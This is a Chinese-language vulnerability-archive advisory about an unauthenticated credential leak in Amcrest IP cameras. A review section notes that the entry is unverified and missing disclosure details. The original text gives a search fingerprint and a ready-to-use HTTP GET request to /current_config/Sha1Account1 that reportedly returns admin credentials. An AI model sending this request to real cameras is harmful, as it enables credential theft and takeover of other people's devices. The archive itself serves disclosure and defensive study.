---
source: "wy876 漏洞文库"
id: "vw-2a986d4098ff2de7b5277036"
entity_id: "ve-2a986d4098ff2de7b5277036"
schema_version: "1"
title: "Amcrest IP Camera Web Sha1Account1账号密码泄漏漏洞"
product: "Amcrest IP Camera Web，具体型号未知"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "无认证声称，无固件/型号"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E6%99%BA%E8%83%BD%E8%AE%BE%E5%A4%87/Amcrest/AmcrestIPCameraWebSha1Account1%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要且已脱敏的响应，不能由接口可达推定敏感内容已泄露"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/aaoz7mqhlml5nepq"
source_status: "recorded"
---

# Amcrest IP Camera Web Sha1Account1账号密码泄漏漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Amcrest IP Camera Web，具体型号未知
- 本文讨论：current_config/Sha1Account1未授权配置读取
- 版本、权限与配置前提：无认证声称，无固件/型号
- 资料类型：摄像头凭据读取摘要；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 无响应字段，无法区分明文密码与哈希/配置；品牌宽指纹不代表全部产品
- 缺原始披露/修复
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要且已脱敏的响应，不能由接口可达推定敏感内容已泄露

### 待核与来源

- 鉴权边界、泄露内容及固件范围待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


### 一、漏洞描述
Amcrest IP Camera Web是Amcrest公司的一款无线IP摄像头，设备允许未经身份验证的攻击者下载管理凭据。

### 二、影响版本
<font style="color:#000000;">Amcrest-IP-Camera-Web</font>

### 三、资产测绘
```plain
"Amcrest"
```


### 四、漏洞复现
```http
GET /current_config/Sha1Account1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/aaoz7mqhlml5nepq>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
